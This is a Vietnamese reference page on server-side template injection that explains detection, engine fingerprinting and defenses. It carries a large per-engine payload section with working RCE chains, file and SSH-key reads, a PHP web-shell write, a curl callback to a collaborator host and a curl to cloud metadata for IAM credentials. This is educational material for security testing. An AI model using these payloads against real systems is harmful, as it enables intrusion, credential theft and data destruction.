# Server-Side Template Injection

> Đầu vào được render bởi một template engine thực thi cú pháp của engine, thường dẫn tới RCE. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/ssti.md`](../../../../Troubleshooting_Guide/ssti.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** SSTI · A03:2021 Injection
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
Server-side template injection xảy ra khi đầu vào người dùng được nhúng vào một template phía máy chủ
mà sau đó được render bởi một template engine (Jinja2, Twig, FreeMarker, ERB, v.v.), khiến đầu vào
được đánh giá như cú pháp template thay vì được in ra như dữ liệu. Vì các template thường có thể truy
cập các đối tượng và phương thức, điều này thường leo thang từ đánh giá biểu thức thành thực thi mã
từ xa toàn diện.

## Cơ chế hoạt động (How it works)
Ứng dụng dựng một chuỗi template bằng cách nối đầu vào không đáng tin — ví dụ `render("Hello " + name)`
thay vì truyền `name` như một biến được đặt trong sandbox. Engine phân tích chuỗi kết hợp, nên kẻ
tấn công gửi vào các chỉ thị template (`{{...}}`, `${...}`, `<%= %>`) sẽ được engine đánh giá chúng
trong ngữ cảnh của nó. Từ đó kẻ tấn công đi qua đồ thị đối tượng của ngôn ngữ — `__subclasses__`/`__mro__`
của Python để tới `Popen`, reflection của Java hoặc `Execute` của FreeMarker, chuỗi prototype của
Node để tới `require` — để thoát khỏi template và chạy mã trên máy chủ.

## Tác động (Impact)
Hầu hết các engine cho phép leo thang thành thực thi mã từ xa, dẫn tới xâm nhập máy chủ toàn diện.
Ngay cả các engine có sandbox (ví dụ Django templates) cũng rò rỉ cấu hình nhạy cảm như khóa bí mật
và dữ liệu debug. SSTI cũng là một điểm trung chuyển mạnh sang SSRF (ví dụ metadata cloud) và đọc
file. Mức độ nghiêm trọng thường là nghiêm trọng khi RCE tới được.

## Cách phát hiện (How to detect)
- Một phép thử toán học khớp với cú pháp trả về giá trị đã tính: `{{7*7}}` -> `49`, `${7*7}` -> `49`,
  `<%= 7*7 %>` -> `49`. `7*7` thuần được phản chiếu lại không đổi nghĩa là không có đánh giá.
- Một polyglot như `${{<%[%'"}}%\` gây ra lỗi phân tích template/stack trace nêu tên engine.
- Phân biệt engine: `{{7*'7'}}` trả về `7777777` trong Jinja2 nhưng `49` trong Twig.
- Trường hợp mù xác nhận qua độ trễ thời gian hoặc callback out-of-band từ một payload RCE đặc thù
  cho engine.

## Khai thác (tóm tắt) (Exploitation)
Phát hiện đánh giá bằng một phép thử toán học, lấy dấu vân tay engine (phép thử toán học/chuỗi, thông
báo lỗi), rồi chọn cách leo thang đặc thù cho engine: đi qua subclass tới `Popen` trong Jinja2, môi
trường `_self` trong Twig, `Execute?new()` hoặc reflection trong FreeMarker, chuỗi prototype trong
Handlebars. Khi đầu vào rơi vào bên trong một biểu thức sẵn có, hãy đóng nó lại trước. Xác nhận các
trường hợp mù bằng `sleep` hoặc một callback DNS/HTTP. Payload theo từng engine đầy đủ nằm trong phần
Payload và tài liệu chuyên sâu.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Phát hiện & lấy dấu vân tay engine (Detection & engine fingerprinting)
Bắt đầu với một polyglot phổ quát làm hỏng hầu hết các parser, rồi thu hẹp engine bằng một phép thử toán học và phản hồi mà nó trả về.

```text
${{<%[%'"}}%\
```

| Engine | Phép thử | Kết quả mong đợi |
|--------|-------|-----------------|
| Jinja2 | `{{7*7}}` | `49` |
| Twig | `{{7*7}}` | `49` |
| Tornado | `{{7*7}}` | `49` |
| FreeMarker | `${7*7}` | `49` |
| ERB (Ruby) | `<%= 7*7 %>` | `49` |
| Handlebars | `{{7*7}}` | `{{7*7}}` (không eval — cần chuỗi constructor) |
| Smarty | `{7*7}` | `49` |
| Velocity | `#set($x=7*7)$x` | `49` |

Phân biệt hai engine `{{7*7}}=49` bằng một phép thử nhân chuỗi:

```text
{{7*'7'}}
# Jinja2 -> 7777777
# Twig   -> 49
```

### Tiêm trong ngữ cảnh mã (Code-context injection)
Khi đầu vào rơi vào bên trong một biểu thức sẵn có, đóng nó lại trước, rồi tiêm biểu thức của bạn.

```text
}}{{7*7}}{{//      (Jinja2 / Tornado / Twig)
%>7*7<%=           (ERB)

# example against a name field rendered in code context
blog-post-author-display=user.name}}{{7*7}}   -> "Peter Wiener49"
```

### Jinja2 (Python)
Đi qua subclass để tới `Popen`; chỉ số thay đổi theo từng môi trường, nên hãy liệt kê trước.

```python
# enumerate to find subprocess.Popen, then execute
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[407]('id', shell=True, stdout=-1).communicate()[0].strip()}}

# code-context variant
user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')

# underscore filter blocked -> hex-escaped attr() chain
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# blind: time-based confirmation
{{''.__class__.__mro__[1].__subclasses__()[407]('sleep 5', shell=True).communicate()}}

# blind: DNS/HTTP callback
{{''.__class__.__mro__[1].__subclasses__()[407]('curl http://YOUR-COLLABORATOR-URL', shell=True)}}

# SSRF pivot to cloud metadata
{{''.__class__.__mro__[1].__subclasses__()[407]('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/', shell=True, stdout=-1).communicate()[0].strip()}}
```

### Twig (PHP)
Xác nhận bằng `{{7*7}}`, rồi lạm dụng các phương thức đối tượng hoặc môi trường `_self`.

```text
# arbitrary file read via avatar method, then GET /avatar?avatar=wiener
user.setAvatar('/etc/passwd','image/jpg')
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')

# destructive method call
user.gdprDelete()
```

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

### ERB (Ruby)

```ruby
<%= 7*7 %>                                   # detection -> 49
<% system("rm /home/carlos/morale.txt") %>   # RCE
<%= File.read('/etc/passwd') %>              # file read
```

### FreeMarker (Java)
`${foobar}` kích hoạt một lỗi template dễ nhận biết. Dùng tiện ích `Execute` để RCE, hoặc một chuỗi reflection để thoát sandbox.

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("rm /home/carlos/morale.txt") }

# sandbox escape -> file read via reflection
${product.getClass()
  .getProtectionDomain()
  .getCodeSource()
  .getLocation()
  .toURI()
  .resolve('/home/carlos/my_password.txt')
  .toURL()
  .openStream()
  .readAllBytes()?join(" ")}
```

### Handlebars (Node.js)
Không có eval trực tiếp; đi qua chuỗi prototype để tới `require('child_process')`.

```handlebars
wrtz{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push
          "return require('child_process').exec('rm /home/carlos/morale.txt');"
        }}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Smarty (PHP)

```smarty
{php}echo shell_exec('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### Velocity (Java)

```velocity
#set($str=$class.inspect("java.lang.Runtime").type)
#set($runtime=$str.getRuntime())
#set($process=$runtime.exec("id"))
```

### Mako (Python)

```mako
<%
import os
x=os.popen('id').read()
%>
${x}
```

### Django (Python) — tiết lộ thông tin (Django (Python) — information disclosure)
Ngôn ngữ template của Django được đặt trong sandbox (không RCE trực tiếp), nhưng phơi bày cấu hình và dữ liệu debug.

```django
{% debug %}                 {# enumerate available objects #}
{{settings.SECRET_KEY}}     {# leak signing key #}
```

### Tham chiếu RCE theo engine (Engine RCE reference)

| Engine | Cú pháp | Phương thức RCE |
|--------|--------|-----------|
| Jinja2 | `{{ }}`, `{% %}` | Đi qua subclass -> Popen |
| Twig | `{{ }}` | Đối tượng `_self`, registerUndefinedFilterCallback |
| ERB | `<%= %>` | `File.read`, `system()` |
| FreeMarker | `${ }`, `<# >` | `Execute?new()`, Java reflection |
| Handlebars | `{{ }}` | Chuỗi prototype -> `require()` |
| Smarty | `{ }` | `{php}`, `writeFile` |
| Velocity | `${ }`, `#if` | ClassTool, `Runtime.exec` |
| Mako | `${ }`, `<% %>` | Thực thi mã Python |
| Tornado | `{{ }}` | Thực thi mã Python |
| Django | `{{ }}`, `{% %}` | Phơi bày Settings, `{% debug %}` |

## Phòng chống (Defenses)
1. **Không bao giờ nối đầu vào người dùng vào một template**; chỉ truyền nó như dữ liệu được gắn vào
   một biến ngữ cảnh, để nó được render/escape, không bao giờ bị phân tích như cú pháp (bản vá chính).
2. **Không cho phép người dùng cung cấp template.** Nếu template do người dùng định nghĩa là một yêu
   cầu bắt buộc, dùng một engine không-logic (ví dụ Mustache) hoặc một sandbox nghiêm ngặt, đã được kiểm định.
3. **Làm cứng engine** — bật sandbox/autoescape, tắt các tính năng và global nguy hiểm, và giữ engine
   được vá.
4. Chạy việc render trong một tiến trình/container **đặc quyền tối thiểu, cô lập** để khống chế bất
   kỳ sự thoát nào.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=Server-Side+Template+Injection
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Server-Side+Template+Injection
- **Exploit-DB** — https://www.exploit-db.com/search?q=Server-Side+Template+Injection
- **GitHub Advisories** — https://github.com/advisories?query=Server-Side+Template+Injection
- **OSV** — https://osv.dev/list?q=Server-Side+Template+Injection
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, X/Twitter infosec.
- _Mẹo tìm kiếm: thêm sản phẩm + phiên bản mục tiêu, ví dụ `Server-Side Template Injection <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi dựa vào chi tiết._
- `CVE-2019-8341` — SSTI Jinja2 trong chính Jinja (`from_string`) dẫn tới thực thi mã.
- `CVE-2016-10033` — RCE PHPMailer; tuy là lỗi mail-injection, nó nằm bên cạnh các trường hợp SSTI
  FreeMarker/OGNL kinh điển của Atlassian Confluence vốn đã phổ biến hóa lớp lỗi này.
- `CVE-2022-26134` — Tiêm OGNL trong Atlassian Confluence (tiêm template/biểu thức) bị khai thác
  trong thực tế để RCE không cần xác thực.

## Tham khảo (References)
- PortSwigger Web Security Academy — Server-side template injection.
- OWASP — Server-Side Template Injection testing (WSTG).
- James Kettle (PortSwigger) — bài nghiên cứu "Server-Side Template Injection: RCE for the modern webapp".
